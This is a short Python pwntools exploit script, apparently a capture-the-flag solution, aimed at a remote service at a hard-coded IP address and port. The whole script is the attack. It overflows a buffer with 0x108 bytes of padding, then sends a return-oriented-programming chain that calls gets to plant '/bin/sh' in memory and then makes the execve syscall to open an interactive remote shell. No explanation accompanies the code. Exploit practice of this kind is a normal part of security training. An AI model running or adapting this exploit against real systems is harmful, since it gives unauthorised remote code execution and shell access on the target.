from pwn import *

context.log_level = 'debug'

base = 0x604800

pop_rsp = 0x000000000040245e
pop_rdi = 0x000000000040141c
pop_rsi_r15 = 0x000000000040141a
pop_rdx = 0x00000000004023f5
pop_rax = 0x0000000000400121
syscall = 0x00000000004003fc
gets = 0x4004EE


#p = process('./chall')
p = remote('13.231.207.73', 9010)
p.recvuntil('name?')
#p.sendline(b'asjkfdljsldkfj\0\0\0\0\0\0\0')
#p.interactive()


rop = [pop_rdi, base, gets, pop_rdi, base, pop_rsi_r15, base + 8, 0, pop_rdx, 
        base + 8, pop_rax, 0x3b, syscall]
rop = b''.join(map(p64, rop))

pause()
p.sendline(b'A' * 0x108 + rop)
p.sendline(b'/bin/sh\0' + p64(0))
p.interactive()


